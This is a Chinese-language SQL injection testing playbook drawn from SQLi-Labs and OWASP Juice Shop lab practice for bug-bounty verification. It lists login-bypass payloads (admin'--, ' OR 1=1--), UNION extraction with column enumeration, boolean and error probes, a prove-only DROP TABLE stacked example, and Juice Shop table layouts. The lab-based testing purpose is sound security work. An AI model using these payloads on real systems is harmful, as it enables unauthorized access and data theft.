---
name: sql-injection
category: sqli
source: 渗透/sqli-labs-closeout/patterns/sqli-labs-methodology.md
verified_in: [sqli-labs-lessons-1-65, juice-shop-sqli-login, juice-shop-sqli-union]
src_value: high
severity_ceiling: critical
requires_auth: false
payload_count: 4
---

# SQL 注入验证剧本（方法论增强版）

> 来源：SQLi-Labs 五步方法论 + OWASP Juice Shop 实战 payload 合并。先识别上下文，再选 payload，最小破坏证明。
> **实测记录（2026-08-23, Juice Shop 20.1.1）**：登录接口 `email: "admin@juice-sh.op'--"` 绕过密码校验，解锁 `Login Admin` 挑战。✅

## 0. 靶场实测要点（先读）

- **先分清 SQL vs NoSQL**：同名"搜索"接口可能走 NoSQL，也可能走 SQL——**用 `'` 报错信息区分**：`SQLITE_ERROR: incomplete input` 是 SQL（Juice Shop 20.1.1 `/rest/products/search` 实测为 SQLite）；表达式拼接/500 无 SQL 错误是 NoSQL。**不要凭版本记忆下结论，每版必测**
- **登录 SQLi 是最稳入口**：字符串拼接型登录接口（`'--` / `' OR 1=1--`）几乎必测，可解锁管理员登录类挑战
- **报错信息泄露堆栈**：SQLite 错误页会直接输出 `SQLITE_ERROR: near "UNION": syntax error`——用错误信息快速确认 DB 类型与语法上下文
- **多括号包裹的查询用 `'))` 闭合**（2026-08-23 实测）：`WHERE ((name LIKE '%Q%' OR ...) AND deletedAt IS NULL) ORDER BY name` 结构下，`q=')) ORDER BY N--` 探测列数（9 列），`q=')) UNION SELECT ...--` 注入；`--` 后直接接 `%'` 会被注释掉，无需额外闭合
- **软删除商品可经 API 直接入篮**（Christmas Special 实测）：`POST /api/BasketItems {"ProductId": <软删除商品id>}` 不校验 deletedAt → 结算即触发业务影响判定
- **UNION 伪造登录行**（Ephemeral Accountant 实测）：`models.sequelize.query(sql, {model, plain:true})` 场景可用 `' UNION SELECT <全列字面量>--` 伪造任意用户登录（需精确列数，User 模型 13 列）

## 1. 识别

**五步流程（SQLi-Labs 方法论）**：
1. 记录目标 URL、参数、方法、cookie 状态、基线响应
2. 识别注入上下文：numeric（数字型）| string（单引号）| double-quote（双引号）| cookie | header | POST body | stacked（堆叠）
3. 用最小破坏证明：语法错误 → 布尔差异 → UNION 反射 → 时间延迟
4. 捕获证据：request / response 摘录 / 结论
5. 更新进度记录

### 上下文探测速查

| 上下文 | 探测 payload | 预期差异 |
|--------|-------------|----------|
| 数字型 | `?id=1 AND 1=1` vs `?id=1 AND 1=2` | 前者正常后者报错/空 |
| 字符型 | `?id=1'` → 报错 | 单引号打破闭合 |
| 双引号型 | `?id=1"` → 报错 | 双引号打破闭合 |
| Cookie/Header | `Cookie: id=1'--` | 服务端从非请求体取参 |
| 堆叠 | `?id=1; DROP TABLE--` | 多语句执行（⚠️ 只证明，不执行） |

## 2. Payload 序列

按优先级从最小破坏开始：

```sql
-- 1. 布尔盲注（最小破坏）
' AND 1=1--  /  ' AND 1=2--

-- 2. 语法错误探测（确认注入点）
'  /  "  /  ')  /  '))

-- 3. UNION SELECT（数据提取，需先枚举列数）
' ORDER BY 1--   →  递增直到报错确定列数
' UNION SELECT 1,2,3,...--  （列数匹配后替换为字段）

-- 4. 登录绕过（字符串拼接型，juice-shop 实战）
'--           -- 注释掉密码与状态检查
' OR 1=1--
admin'--
```

### 已知表结构速查（juice-shop 实战参考）

| 目标 | 列数 | 常用字段 |
|------|------|----------|
| Products 表 | 9 列 | id, name, description, price |
| Users 表 | 13 列 | id, email, password, role |

> SRC 场景先用 `ORDER BY` 枚举列数，再按需提取。提取只取字段结构证明，不批量导出。

## 3. 判定标准

confirmed 需同时满足：
- [ ] 注入 payload 与基线请求形成可复现差异（布尔/报错/时间/UNION 反射）
- [ ] UNION 提取出预期字段（或盲注逐字符验证成功）
- [ ] 串行复现 ≥2 次

## 4. 证据要求

按 `evidence-record.md`：
- 基线请求（无 payload）+ 注入请求完整对照
- 响应摘录显示差异（报错信息/记录数/回显字段）
- 提取数据只保留证明片段

## 5. SRC 适用边界

- 适用：任何带参数查询的 Web 应用（登录、搜索、详情页、排序）
- 不适用：全参数化查询/ORM 强约束后端（先验证再投入）
- ⚠️ 敏感操作：堆叠查询只证明可执行，绝不实际执行写操作；时间盲注控制延时 ≤3s 避免拖垮目标
